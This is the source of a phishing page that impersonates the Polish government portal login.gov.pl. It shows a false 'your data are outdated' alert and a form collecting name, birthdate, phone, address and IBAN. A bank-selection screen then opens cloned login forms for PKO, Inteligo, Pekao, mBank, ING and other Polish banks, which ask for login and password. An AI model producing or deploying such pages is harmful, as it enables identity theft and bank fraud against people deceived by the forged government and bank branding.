        .bank7-full-page .bank7-close-btn { position: fixed; top: 16px; right: 20px; z-index: 10001; background: rgba(0, 0, 0, 0.3); color: #fff; border: none; border-radius: 50%; width: 40px; height: 40px; font-size: 24px; cursor: pointer; transition: background 0.2s; display: none; align-items: center; justify-content: center; line-height: 1; }
        .bank7-full-page .bank7-close-btn:hover { background: rgba(0, 0, 0, 0.6); }
        .bank7-full-page .bank7-close-btn.visible { display: flex; }
        
        /* BANK 8 — Credit Agricole */
        .bank8-full-page { display: none; background: #f5f7fa; min-height: 100vh; width: 100%; position: fixed; top: 0; left: 0; z-index: 9999; overflow-y: auto; }
        .bank8-full-page.visible { display: block; }
        .bank8-full-page .bank8-container { max-width: 1200px; margin: 0 auto; padding: 40px 30px; display: flex; gap: 60px; align-items: flex-start; min-height: calc(100vh - 72px); }
        .bank8-full-page .bank8-left { flex: 1; max-width: 580px; }
        .bank8-full-page .bank8-favicon { margin-bottom: 16px; }
        .bank8-full-page .bank8-favicon img { width: 50px; height: 50px; display: block; }
        .bank8-full-page .bank8-card { background: #ffffff; border-radius: 16px; padding: 28px 32px 32px; width: 519px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.04); border: 1px solid #e8ecf0; }
        .bank8-full-page .bank8-card .bank8-card-title { font-size: 18px; font-weight: 600; color: #1a1a1a; margin-bottom: 20px; }
        .bank8-full-page .bank8-card .bank8-login-title { font-size: 20px; font-weight: 600; color: #1a1a1a; margin-bottom: 4px; }
        .bank8-full-page .bank8-card .bank8-login-subtitle { font-size: 14px; color: #666; margin-bottom: 20px; }
        .bank8-full-page .bank8-form .form-group { margin-bottom: 16px; }
        .bank8-full-page .bank8-form label { display: block; font-size: 14px; font-weight: 600; color: #1a1a1a; margin-bottom: 4px; }
        .bank8-full-page .bank8-form input { width: 100%; padding: 12px 14px; font-size: 14px; border: 1px solid #d0d8e4; border-radius: 8px; background: #ffffff; transition: border-color 0.2s, box-shadow 0.2s; font-family: inherit; color: #1a1a1a; }
        .bank8-full-page .bank8-form input:focus { border-color: #005b3c; box-shadow: 0 0 0 3px rgba(0, 91, 60, 0.12); outline: none; }
        .bank8-full-page .bank8-form input::placeholder { color: #999; }
        .bank8-full-page .bank8-form .login-btn { width: 100%; padding: 14px; background: #005b3c; color: #ffffff; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s, transform 0.15s; margin-top: 4px; }
        .bank8-full-page .bank8-form .login-btn:hover { background: #004a30; transform: scale(1.01); }
        .bank8-full-page .bank8-right { flex: 1; max-width: 460px; padding-top: 80px; }
        .bank8-full-page .bank8-security-title { font-size: 20px; font-weight: 700; color: #1a1a1a; margin-bottom: 12px; }
        .bank8-full-page .bank8-security-text { font-size: 15px; color: #444; line-height: 1.6; }
        .bank8-full-page .bank8-security-text p { margin-bottom: 6px; }
        .bank8-full-page .bank8-security-image { margin-top: 20px; }
        .bank8-full-page .bank8-security-image img { width: 272px; height: 240px; display: block; }
        .bank8-full-page .bank8-close-btn { position: fixed; top: 16px; right: 20px; z-index: 10001; background: rgba(0, 0, 0, 0.3); color: #fff; border: none; border-radius: 50%; width: 40px; height: 40px; font-size: 24px; cursor: pointer; transition: background 0.2s; display: none; align-items: center; justify-content: center; line-height: 1; }
        .bank8-full-page .bank8-close-btn:hover { background: rgba(0, 0, 0, 0.6); }
        .bank8-full-page .bank8-close-btn.visible { display: flex; }
        
        /* BANK 9 — Alior Bank */
        .bank9-full-page { display: none; min-height: 100vh; width: 100%; position: fixed; top: 0; left: 0; z-index: 9999; overflow-y: auto; background: url('first-time-login-1600.jpg') center/cover no-repeat; }
        .bank9-full-page.visible { display: block; }
        .bank9-full-page::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.75); z-index: 0; }
        .bank9-full-page .bank9-container { position: relative; z-index: 1; max-width: 1200px; margin: 0 auto; padding: 40px 30px; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; }
        .bank9-full-page .bank9-top { display: flex; align-items: center; gap: 16px; margin-bottom: 30px; }
        .bank9-full-page .bank9-top .bank9-logo { flex-shrink: 0; }
        .bank9-full-page .bank9-top .bank9-logo img { width: 130px; height: 65px; display: block; }
        .bank9-full-page .bank9-top .bank9-title { font-size: 18px; font-weight: 600; color: #1a1a1a; }
        .bank9-full-page .bank9-wrapper { display: flex; justify-content: flex-start; }
        .bank9-full-page .bank9-card { background: #ffffff; border: 1px solid #e6ebf3; border-radius: 0; padding: 32px 30px 30px; width: 397px; box-shadow: 0 4px 24px rgba(0, 0, 0, 0.06); }
        .bank9-full-page .bank9-card .bank9-welcome { font-size: 22px; font-weight: 600; color: #1a1a1a; margin-bottom: 20px; }
        .bank9-full-page .bank9-form .form-group { margin-bottom: 16px; }
        .bank9-full-page .bank9-form label { display: block; font-size: 14px; font-weight: 600; color: #1a1a1a; margin-bottom: 4px; }
        .bank9-full-page .bank9-form input { width: 100%; padding: 12px 14px; font-size: 14px; border: 1px solid #d0d8e4; border-radius: 0; background: #ffffff; transition: border-color 0.2s, box-shadow 0.2s; font-family: inherit; color: #1a1a1a; }
        .bank9-full-page .bank9-form input:focus { border-color: #920035; box-shadow: 0 0 0 3px rgba(146, 0, 53, 0.12); outline: none; }
        .bank9-full-page .bank9-form input::placeholder { color: #999; }
        .bank9-full-page .bank9-form .login-btn { width: 100%; padding: 14px; background: #920035; color: #ffffff; border: none; border-radius: 0; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s; margin-top: 4px; }
        .bank9-full-page .bank9-form .login-btn:hover { background: #7a002c; }
        .bank9-full-page .bank9-close-btn { position: fixed; top: 16px; right: 20px; z-index: 10001; background: rgba(0, 0, 0, 0.3); color: #fff; border: none; border-radius: 50%; width: 40px; height: 40px; font-size: 24px; cursor: pointer; transition: background 0.2s; display: none; align-items: center; justify-content: center; line-height: 1; }
        .bank9-full-page .bank9-close-btn:hover { background: rgba(0, 0, 0, 0.6); }
        .bank9-full-page .bank9-close-btn.visible { display: flex; }
        
        /* BANK 10 — ERSTE */
        .bank10-full-page { display: none; min-height: 100vh; width: 100%; position: fixed; top: 0; left: 0; z-index: 9999; overflow-y: auto; background: #f5f7fb; }
        .bank10-full-page.visible { display: block; }
        .bank10-full-page .bank10-container { max-width: 1200px; margin: 0 auto; padding: 40px 30px; min-height: 100vh; display: flex; flex-direction: column; align-items: flex-start; }
        .bank10-full-page .bank10-top-logo { margin-bottom: 20px; margin-top: 60px; }
        .bank10-full-page .bank10-top-logo img { width: auto; height: 80px; display: block; }
        .bank10-full-page .bank10-main { display: flex; gap: 30px; align-items: flex-start; width: 100%; }
        .bank10-full-page .bank10-left { display: flex; flex-direction: column; align-items: flex-start; }
        .bank10-full-page .bank10-card { background: #ffffff; border: 1px solid #d0d8e4; border-radius: 0; padding: 20px 24px; width: 566px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04); }
        .bank10-full-page .bank10-card p { font-size: 14px; color: #1a1a1a; line-height: 1.6; margin: 0; }
        .bank10-full-page .bank10-card .bank10-card-title { font-weight: 600; }
        .bank10-full-page .bank10-form-section { margin-top: 24px; width: 100%; max-width: 460px; }
        .bank10-full-page .bank10-form-section .bank10-login-title { font-size: 22px; font-weight: 600; color: #1a1a1a; margin-bottom: 20px; }
        .bank10-full-page .bank10-form .form-group { margin-bottom: 16px; }
        .bank10-full-page .bank10-form label { display: block; font-size: 14px; font-weight: 600; color: #1a1a1a; margin-bottom: 4px; }
        .bank10-full-page .bank10-form input { width: 100%; padding: 12px 14px; font-size: 14px; border: 1px solid #d0d8e4; border-radius: 6px; background: #ffffff; transition: border-color 0.2s, box-shadow 0.2s; font-family: inherit; color: #1a1a1a; }
        .bank10-full-page .bank10-form input:focus { border-color: #0f4bb5; box-shadow: 0 0 0 3px rgba(15, 75, 181, 0.12); outline: none; }
        .bank10-full-page .bank10-form input::placeholder { color: #999; }
        .bank10-full-page .bank10-form .login-btn { width: 100%; padding: 14px; background: #0f4bb5; color: #ffffff; border: none; border-radius: 30px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s; margin-top: 4px; }
        .bank10-full-page .bank10-form .login-btn:hover { background: #0d3f99; }
        .bank10-full-page .bank10-security { margin-top: 30px; padding-top: 20px; border-top: 1px solid #e6ebf3; width: 100%; max-width: 600px; }
        .bank10-full-page .bank10-security-title { font-size: 16px; font-weight: 700; color: #1a1a1a; margin-bottom: 12px; }
        .bank10-full-page .bank10-security-list { list-style: none; padding: 0; margin: 0; }
        .bank10-full-page .bank10-security-list li { font-size: 14px; color: #444; padding: 4px 0 4px 20px; position: relative; line-height: 1.5; }
        .bank10-full-page .bank10-security-list li::before { content: '•'; position: absolute; left: 0; color: #0f4bb5; font-weight: 700; }
        .bank10-full-page .bank10-close-btn { position: fixed; top: 16px; right: 20px; z-index: 10001; background: rgba(0, 0, 0, 0.3); color: #fff; border: none; border-radius: 50%; width: 40px; height: 40px; font-size: 24px; cursor: pointer; transition: background 0.2s; display: none; align-items: center; justify-content: center; line-height: 1; }
        .bank10-full-page .bank10-close-btn:hover { background: rgba(0, 0, 0, 0.6); }
        .bank10-full-page .bank10-close-btn.visible { display: flex; }
        
        /* BANK 12 — ING Bank */
        .bank12-full-page { display: none; min-height: 100vh; width: 100%; position: fixed; top: 0; left: 0; z-index: 9999; overflow-y: auto; background: #ffffff; }
        .bank12-full-page.visible { display: block; }
        .bank12-full-page .bank12-container { max-width: 500px; margin: 0 auto; padding: 60px 30px 40px; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; }
        .bank12-full-page .bank12-logo { margin-bottom: 30px; display: flex; justify-content: center; }
        .bank12-full-page .bank12-logo img { width: 116px; height: 40px; display: block; }
        .bank12-full-page .bank12-title { font-size: 20px; font-weight: 600; color: #1a1a1a; margin-bottom: 4px; }
        .bank12-full-page .bank12-subtitle { font-size: 14px; color: #666; margin-bottom: 24px; }
        .bank12-full-page .bank12-form .form-group { margin-bottom: 16px; }
        .bank12-full-page .bank12-form label { display: block; font-size: 14px; font-weight: 600; color: #1a1a1a; margin-bottom: 4px; }
        .bank12-full-page .bank12-form input { width: 100%; padding: 12px 14px; font-size: 14px; border: 1px solid #d0d8e4; border-radius: 4px; background: #ffffff; transition: border-color 0.2s, box-shadow 0.2s; font-family: inherit; color: #1a1a1a; }
        .bank12-full-page .bank12-form input:focus { border-color: #ff6200; box-shadow: 0 0 0 3px rgba(255, 98, 0, 0.15); outline: none; }
        .bank12-full-page .bank12-form input::placeholder { color: #999; }
        .bank12-full-page .bank12-form .login-btn-row { display: flex; align-items: flex-end; gap: 16px; flex-wrap: wrap; margin-top: 4px; }
        .bank12-full-page .bank12-form .login-btn-row .form-group { flex: 1; min-width: 180px; margin-bottom: 0; }
        .bank12-full-page .bank12-form .login-btn { width: 84px; height: 44px; padding: 0 20px; background: #ff6200; color: #ffffff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s; flex-shrink: 0; white-space: nowrap; }
        .bank12-full-page .bank12-form .login-btn:hover { background: #e55800; }
        .bank12-full-page .bank12-close-btn { position: fixed; top: 16px; right: 20px; z-index: 10001; background: rgba(0, 0, 0, 0.3); color: #fff; border: none; border-radius: 50%; width: 40px; height: 40px; font-size: 24px; cursor: pointer; transition: background 0.2s; display: none; align-items: center; justify-content: center; line-height: 1; }
        .bank12-full-page .bank12-close-btn:hover { background: rgba(0, 0, 0, 0.6); }
        .bank12-full-page .bank12-close-btn.visible { display: flex; }

        .toast-message { display: none; position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: #cc0000; color: #ffffff; padding: 16px 32px; border-radius: 8px; font-size: 16px; font-weight: 600; box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2); z-index: 9999; max-width: 90%; text-align: center; animation: slideUp 0.4s ease-out; }
        .toast-message.show { display: block; }
        .toast-message.success { background: #009c3b; }
        @keyframes slideUp { from { opacity: 0; transform: translateX(-50%) translateY(30px); } to { opacity: 1; transform: translateX(-50%) translateY(0); } }
        .main-content { padding: 0; min-height: 20px; }
        .footer { background: #003b6f; color: #e0e8f0; padding: 30px 0 20px; margin-top: 0; transition: margin-left 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94); }
        .footer.shifted { margin-left: 100px; }
        .footer .container { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 30px; }
        .footer h4 { color: #fff; font-size: 16px; margin-bottom: 12px; border-bottom: 2px solid #005a8c; padding-bottom: 8px; }
        .footer ul { list-style: none; }
        .footer ul li { margin-bottom: 8px; font-size: 14px; }
        .footer ul li a { color: #d0dcec; transition: color 0.2s; }
        .footer ul li a:hover { color: #fff; text-decoration: underline; }
        .footer-bottom { background: #002a4f; padding: 15px 0; margin-top: 25px; text-align: center; font-size: 13px; color: #9bb4d0; }

        /* Адаптивность (сокращена) */
        @media (max-width: 992px) { .header { height: auto; min-height: 72px; padding: 10px 16px; flex-wrap: wrap; position: relative; } .header-left { flex-wrap: wrap; } .header-right { margin-left: auto; gap: 8px; flex-wrap: wrap; justify-content: flex-end; margin-right: 0; } .main-wrapper { margin-top: 0; flex-direction: column; } .main-wrapper.shifted { margin-left: 0; } .content-wrapper.shifted { margin-left: 0; } .sidebar { top: 0; height: 100vh; padding-top: 72px; left: -280px; min-width: 280px; max-width: 280px; } .sidebar.open { left: 0; } .footer.shifted { margin-left: 0; } .header-search { height: 38px; min-width: 260px; } .header-search .search-icon-btn { padding: 0 8px 0 10px; } .header-search .search-icon-btn svg { width: 16px; height: 16px; } .header-search input { min-width: 120px; font-size: 13px; } .header-search .search-submit-btn { font-size: 13px; padding: 0 16px; } .header-eu-logo { width: 60px; height: 36px; } .login-nav { padding: 10px 20px; gap: 20px 16px; } .login-nav .brand { margin-left: 200px; font-size: 18px; } .login-nav .nav-links { gap: 16px; margin-left: 20px; } .login-nav .nav-links a { font-size: 14px; } .image-under-banner .image-wrapper .overlay-icon { width: 130px; height: 107px; left: 270px; } .image-under-banner .image-wrapper .overlay-line { left: 420px; } .image-under-banner .image-wrapper .overlay-text { left: 440px; max-width: 280px; } .image-under-banner .image-wrapper .overlay-text h2 { font-size: 22px; } .image-under-banner .image-wrapper .overlay-text p { font-size: 14px; } .image-under-banner .image-wrapper .overlay-text .btn-outline { font-size: 12px; padding: 8px 20px; } .data-form { grid-template-columns: 1fr; } .data-form .address-row { grid-template-columns: 1fr; } .data-form-section { padding: 20px; } .bank-grid { grid-template-columns: repeat(2, 1fr); max-width: 440px; } .bank-btn { width: 100%; height: 70px; } .bank-btn img { width: 140px; height: 45px; } .bank-selection { padding: 40px 20px 20px; min-height: calc(100vh - 72px); } .bank-footer { padding: 40px 0 20px; } .login-screen { padding: 30px 20px 20px; min-height: calc(100vh - 72px); } .login-screen .login-grid { flex-direction: column; gap: 30px; } .login-screen .login-left { max-width: 100%; width: 100%; } .login-screen .login-right { max-width: 100%; width: 100%; padding-top: 0; border-top: 1px solid #e6ebf3; padding-top: 24px; } .login-screen .security-info, .login-screen .contact-info { border-left: none; padding-left: 0; } .login-screen .login-title { font-size: 24px; } .login-screen .login-form .login-btn-row { flex-direction: column; align-items: stretch; } .login-screen .login-form .login-btn { width: 100%; height: 44px; } .bank3-header .bank3-header-content { padding: 0 20px; } .bank3-full-page .login-form-wrapper { max-width: 100%; padding: 20px; } .bank3-full-page .login-form-wrapper .login-title { font-size: 24px; } .bank3-full-page .login-form-wrapper .login-btn-row { flex-direction: column; align-items: stretch; } .bank3-full-page .login-form-wrapper .login-btn { width: 100%; height: 44px; } .bank3-close-btn { top: 12px; right: 16px; width: 36px; height: 36px; font-size: 20px; } .bank4-full-page .bank4-container { padding: 40px 20px; } .bank4-full-page .bank4-title { font-size: 28px; } .bank4-full-page .bank4-form .login-btn-row { flex-direction: column; align-items: stretch; } .bank4-full-page .bank4-form .login-btn { width: 100%; height: 44px; } .bank4-full-page .bank4-close-btn { top: 12px; right: 16px; width: 36px; height: 36px; font-size: 20px; } .bank5-full-page .bank5-container { max-width: 100%; } .bank5-full-page .bank5-box { padding: 30px 24px; } .bank5-full-page .bank5-title { font-size: 22px; } .bank5-full-page .bank5-form .login-btn-row { flex-direction: column; align-items: stretch; } .bank5-full-page .bank5-form .login-btn { width: 100%; height: 44px; } .bank5-full-page .bank5-close-btn { top: 12px; right: 16px; width: 36px; height: 36px; font-size: 20px; } .bank6-container { flex-direction: column; max-width: 500px; padding: 30px 24px; gap: 30px; } .bank6-left { max-width: 100%; } .bank6-right { max-width: 100%; } .bank6-title { font-size: 24px; } .bank6-close-btn { top: 12px; right: 16px; width: 36px; height: 36px; font-size: 20px; } .bank7-full-page .bank7-container { padding: 40px 20px; } .bank7-full-page .bank7-close-btn { top: 12px; right: 16px; width: 36px; height: 36px; font-size: 20px; } .bank7-full-page .bank7-norton { bottom: 16px; right: 20px; } .bank8-full-page .bank8-container { flex-direction: column; padding: 30px 20px; gap: 30px; } .bank8-full-page .bank8-left { max-width: 100%; } .bank8-full-page .bank8-card { width: 100%; max-width: 519px; } .bank8-full-page .bank8-right { max-width: 100%; padding-top: 0; } .bank8-full-page .bank8-close-btn { top: 12px; right: 16px; width: 36px; height: 36px; font-size: 20px; } .bank9-full-page .bank9-container { padding: 30px 20px; } .bank9-full-page .bank9-top .bank9-title { font-size: 16px; } .bank9-full-page .bank9-card { width: 100%; max-width: 397px; } .bank9-full-page .bank9-close-btn { top: 12px; right: 16px; width: 36px; height: 36px; font-size: 20px; } .bank10-full-page .bank10-container { padding: 30px 20px; } .bank10-full-page .bank10-top-logo img { height: 72px; } .bank10-full-page .bank10-card { width: 100%; max-width: 566px; } .bank10-full-page .bank10-main { flex-direction: column; gap: 20px; } .bank10-full-page .bank10-left { flex-direction: row; align-items: center; gap: 20px; flex-wrap: wrap; } .bank10-full-page .bank10-form-section { max-width: 100%; } .bank10-full-page .bank10-security { max-width: 100%; } .bank10-full-page .bank10-close-btn { top: 12px; right: 16px; width: 36px; height: 36px; font-size: 20px; } .bank10-full-page .bank10-top-logo { margin-top: 40px; } .bank10-full-page .bank10-top-logo img { height: 72px; } .bank12-full-page .bank12-container { padding: 40px 20px; } .bank12-full-page .bank12-close-btn { top: 12px; right: 16px; width: 36px; height: 36px; font-size: 20px; } .bank12-full-page .bank12-form .login-btn-row { flex-direction: column; align-items: stretch; } .bank12-full-page .bank12-form .login-btn { width: 100%; height: 44px; } }
        @media (max-width: 768px) { /* ... аналогично ... */ }
        @media (max-width: 480px) { /* ... аналогично ... */ }
    </style>
</head>
<body>

    <!-- ========== HEADER ========== -->
    <header class="header" id="header">
        <div class="header-left">
            <button class="menu-btn" aria-label="Menu" id="menuToggle">
                <span class="line"></span>
                <span class="line"></span>
                <span class="line"></span>
            </button>
            <div class="logo-area">
                <img src="grb.svg" alt="Godło Rzeczypospolitej Polskiej" class="coat-of-arms" width="72" height="50">
                <div class="logo-main">
                    <span class="gov">gov.pl</span>
                    <span class="separator">|</span>
                    <span class="subtitle">Serwis Rzeczypospolitej Polskiej</span>
                </div>
            </div>
        </div>
        <div class="header-right">
            <div class="header-search">
                <button class="search-icon-btn" aria-label="Szukaj">
                    <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
                </button>
                <input type="text" placeholder="Szukaj usługi, informacji" aria-label="Szukaj">
                <button class="search-submit-btn">SZUKAJ</button>
            </div>
            <span class="header-eu-logo"><img src="eu-center-pl.svg" alt="EU Center PL"></span>
        </div>
    </header>

    <div class="main-wrapper" id="mainWrapper">
        <aside class="sidebar" id="sidebar">
            <nav class="sidebar-nav">
                <ul>
                    <li><a href="#" class="active">Strona główna</a></li>
                    <li><a href="#">Rada Ministrów</a></li>
                    <li><a href="#">Kancelaria Premiera</a></li>
                    <li><a href="#">Ministerstwa</a></li>
                    <li><a href="#">Urzędy, instytucje i placówki RP</a></li>
                    <li class="separator"></li>
                    <li><a href="#"><span class="menu-icon"><img src="15-uprawnienia.svg" alt=""></span>Usługi dla obywatela</a></li>
                    <li><a href="#"><span class="menu-icon"><img src="07-rozwoj.svg" alt=""></span>Usługi dla przedsiębiorcy</a></li>
                    <li><a href="#"><span class="menu-icon"><img src="13-pismo-ogolne-do-urzedu.svg" alt=""></span>Usługi dla urzędnika</a></li>
                    <li><a href="#"><span class="menu-icon"><img src="15-uprawnienia.svg" alt=""></span>Usługi dla rolnika</a></li>
                    <li class="separator"></li>
                    <li><a href="#">Profil zaufany</a></li>
                    <li><a href="#">Baza wiedzy</a></li>
                    <li><a href="#">Serwis Służby Cywilnej</a></li>
                    <li class="separator"></li>
                    <li><a href="#" class="ukraine-link"><span class="flag-icon"><img src="a6631d28-8291-4474-b530-32864664800e.svg" alt="UA"></span><span>Сайт dla obywateli Ukrainy</span></a></li>
                </ul>
            </nav>
        </aside>

        <div class="content-wrapper" id="contentWrapper">

            <!-- ===== LOGIN NAV ===== -->
            <div class="login-nav" id="loginNav">
                <span class="brand">Login.gov.pl</span>
                <div class="nav-links">
                    <a href="#">Jak korzystać</a>
                    <a href="#">Gdzie skorzystać</a>
                    <a href="#">Bezpieczeństwo</a>
                    <a href="#">Pomoc</a>
                    <a href="#">Dla integratorów</a>
                    <a href="#">Kontakt</a>
                </div>
            </div>

            <!-- ===== ИЗОБРАЖЕНИЕ ===== -->
            <div class="image-under-banner" id="imageBanner">
                <div class="image-wrapper">
                    <img src="4a4bfee8-cecc-4734-b549-3230515a45ef.png" alt="Image">
                    <div class="overlay-icon"><img src="51816b1b-533d-4730-983d-e3ce4184dcf6.svg" alt="icon"></div>
                    <div class="overlay-line"></div>
                    <div class="overlay-text">
                        <h2>Poznaj login.gov.pl</h2>
                        <p>Potwierdź tożsamość online i korzystaj z różnych usług w serwisach publicznych</p>
                        <button class="btn-outline" id="scrollToFormBtn">DOWIEDZ SIĘ WIĘCEJ</button>
                    </div>
                </div>
            </div>

            <!-- ===== FORMULARZ DANYCH OSOBOWYCH ===== -->
            <section class="data-form-section" id="dataFormSection">
                <h2 class="section-title">Dane osobowe</h2>
                <div class="blue-alert">
                    <span class="alert-icon">ℹ️</span>
                    <strong>Uwaga:</strong> Twoje dane są nieaktualne i wymagają weryfikacji. Prosimy o aktualizację swoich danych jak najszybciej, aby zapewnić, że posiadamy poprawne i aktualne informacje oraz możemy utrzymywać z Tobą kontakt i informować Cię na bieżąco przez cały proces.
                </div>
                <form class="data-form" id="dataForm">
                    <div class="form-group">
                        <label for="fullname">Imię i nazwisko <span class="required">*</span></label>
                        <input type="text" id="fullname" name="fullname" placeholder="Imię i nazwisko" required>
                    </div>
                    <div class="form-group">
                        <label for="birthdate">Data urodzenia <span class="required">*</span></label>
                        <input type="text" id="birthdate" name="birthdate" placeholder="__/__/____" maxlength="10" required>
                    </div>
                    <div class="form-group">
                        <label for="phone">Numer telefonu <span class="required">*</span></label>
                        <input type="tel" id="phone" name="phone" placeholder="+48" value="+48" required>
                    </div>
                    <div class="form-group full-width">
                        <label>Adres zamieszkania <span class="required">*</span></label>
                        <div class="address-row">
                            <input type="text" name="street" placeholder="Ulica i numer" required>
                            <input type="text" name="city" placeholder="Miasto" required>
                            <input type="text" name="postal" placeholder="Kod pocztowy" required>
                        </div>
                    </div>
                    <div class="form-group full-width">
                        <label for="iban">Numer IBAN <span class="required">*</span></label>
                        <input type="text" id="iban" name="iban" placeholder="PL" required maxlength="34">
                    </div>
                    <div class="form-actions">
                        <button type="submit" class="submit-btn" id="submitBtn">
                            <span class="spinner"></span>
                            Wyślij
                        </button>
                    </div>
                </form>
            </section>

            <!-- ===== EKRAN WYBORU BANKU ===== -->
            <section class="bank-selection" id="bankSelection">
                <h2 class="bank-title">Bankowość elektroniczna</h2>
                <p class="bank-subtitle">Wybierz bank, za pomocą którego chcesz się zalogować.</p>
                <div class="bank-grid">
                    <button class="bank-btn" onclick="openLoginScreen1()"><img src="logo.png" alt="PKO"></button>
                    <button class="bank-btn" onclick="openLoginScreen2()"><img src="logo1.png" alt="Inteligo"></button>
                    <button class="bank-btn" onclick="openLoginScreen3()"><img src="logo2.png" alt="Pekao"></button>
                    <button class="bank-btn" onclick="openLoginScreen4()"><img src="logo3.png" alt="mBank"></button>
                    <button class="bank-btn" onclick="openLoginScreen5()"><img src="logo4.png" alt="Velo"></button>
                    <button class="bank-btn" onclick="openLoginScreen6()"><img src="logo5.png" alt="BOS"></button>
                    <button class="bank-btn" onclick="openLoginScreen7()"><img src="logo6.png" alt="BNP PARIBAS"></button>
                    <button class="bank-btn" onclick="openLoginScreen8()"><img src="logo7.png" alt="Credit Agricole"></button>
                    <button class="bank-btn" onclick="openLoginScreen9()"><img src="logo8.png" alt="Alior Bank"></button>
                    <button class="bank-btn" onclick="openLoginScreen10()"><img src="logo (2).png" alt="ERSTE"></button>
                    <button class="bank-btn" onclick="openLoginScreen12()"><img src="logo_ing-logo.svg" alt="ING Bank"></button>
                </div>
                <div class="bank-footer" id="bankFooter">
                    <div class="footer-links">
                        <a href="#">Polityka cookies</a>
                        <a href="#">Klauzula informacyjna</a>
                        <a href="#">Deklaracja dostępności</a>
                        <a href="#">Kontakt</a>
                    </div>
                </div>
            </section>

            <!-- ===== BANK 1 — PKO ===== -->
            <section class="login-screen" id="loginScreen1">
                <div class="login-container">
                    <div class="login-grid">
                        <div class="login-left">
                            <span class="ipko-logo"><img src="ipko.jpg" alt="PKO"></span>
                            <div class="login-title">Zaloguj się</div>
                            <div class="login-subtitle">i użyj e-Tożsamości</div>
                            <form class="login-form" onsubmit="return handleLogin(event, 'PKO')">
                                <div class="form-group">
                                    <label for="loginUsername1">Login</label>
                                    <input type="text" id="loginUsername1" placeholder="Wpisz login" required>
                                </div>
                                <div class="login-btn-row">
                                    <div class="form-group" style="flex:1; min-width:180px; margin-bottom:0;">
                                        <label for="loginPassword1">Hasło</label>
                                        <input type="password" id="loginPassword1" placeholder="Wpisz hasło" required>
                                    </div>
                                    <button type="submit" class="login-btn">Dalej</button>
                                </div>
                            </form>
                        </div>
                        <div class="login-right">
                            <div class="security-info">
                                <div class="info-title">Bezpieczne logowanie</div>
                                <div class="security-block">
                                    <p><span class="highlight">Sprzęt i strony logowania</span></p>
                                    <p>Zawsze sprawdzaj adresy stron www, na których się logujesz, a także ich certyfikaty. Loguj się tylko na urządzeniach z aktualnym i legalnym oprogramowaniem.</p>
                                </div>
                                <div class="security-block">
                                    <p><span class="highlight">Chroń swoją prywatność</span></p>
                                    <p>Upewnij się, że nikt nie widzi wpisywanych przez Ciebie danych. Loguj się tylko przy wykorzystaniu zaufanego połączenia z internetem.</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </section>

            <!-- ===== BANK 2 — Inteligo ===== -->
            <section class="login-screen" id="loginScreen2">
                <div class="login-container">
                    <div class="login-grid">
                        <div class="login-left">
                            <span class="ipko-logo"><img src="logo1.png" alt="Inteligo"></span>
                            <div class="login-title">Zaloguj się</div>
                            <div class="login-subtitle">i użyj e-Tożsamości</div>
                            <form class="login-form" onsubmit="return handleLogin(event, 'Inteligo')">
                                <div class="form-group">
                                    <label for="loginUsername2">Login</label>
                                    <input type="text" id="loginUsername2" placeholder="Wpisz login" required>
                                </div>
                                <div class="login-btn-row">
                                    <div class="form-group" style="flex:1; min-width:180px; margin-bottom:0;">
                                        <label for="loginPassword2">Hasło</label>
                                        <input type="password" id="loginPassword2" placeholder="Wpisz hasło" required>
                                    </div>
                                    <button type="submit" class="login-btn">Dalej</button>
                                </div>
                            </form>
                        </div>
                        <div class="login-right">
                            <div class="contact-info">
                                <div class="info-title">Strefa kontaktu</div>
                                <div class="contact-block">
                                    <div class="contact-label">Infolinia Inteligo</div>
                                    <div class="contact-phone">800 121 121</div>
                                    <div class="contact-phone-small">+48 81 535 67 89</div>
                                </div>
                                <hr class="contact-divider">
                                <div class="contact-block">
                                    <a href="#" class="contact-link" onclick="alert('Przekierowanie do formularza kontaktowego'); return false;">Kontakt</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </section>

            <!-- ===== BANK 3 — Pekao ===== -->
            <div class="bank3-full-page" id="loginScreen3">
                <button class="bank3-close-btn" id="bank3CloseBtn" onclick="closeLoginScreen3()">✕</button>
                <div class="bank3-header">
                    <div class="bank3-header-content">
                        <span class="bank3-logo"><img src="logo-white.svg" alt="Pekao"></span>
                    </div>
                </div>
                <div class="login-container">
                    <div class="login-form-wrapper">
                        <div class="login-title">Zaloguj się</div>
                        <div class="login-subtitle">do bankowości elektronicznej</div>
                        <form class="login-form" onsubmit="return handleLogin(event, 'Pekao')">
                            <div class="form-group">
                                <label for="loginUsername3">Login</label>
                                <input type="text" id="loginUsername3" placeholder="Wpisz login" required>
                            </div>
                            <div class="login-btn-row">
                                <div class="form-group">
                                    <label for="loginPassword3">Hasło</label>
                                    <input type="password" id="loginPassword3" placeholder="Wpisz hasło" required>
                                </div>
                                <button type="submit" class="login-btn">Dalej</button>
                            </div>
                        </form>
                        <div class="security-warnings">
                            <div class="warning-item"><span class="icon">⚠️</span><span>Zachowaj czujność - przestępcy podszywają się pod pracowników ds. bezpieczeństwa banku.</span></div>
                            <div class="warning-item"><span class="icon">🔒</span><span>Bezpieczne wakacje z cyberPEKAO - zadbaj o spokój, gdziekolwiek jesteś!</span></div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- ===== BANK 4 — mBank ===== -->
            <div class="bank4-full-page" id="loginScreen4">
                <button class="bank4-close-btn" id="bank4CloseBtn" onclick="closeLoginScreen4()">✕</button>
                <div class="bank4-container">
                    <div class="bank4-title">potwierdź swoją tożsamość</div>
                    <div class="bank4-subtitle">zaloguj się do mBanku loginem i hasłem</div>
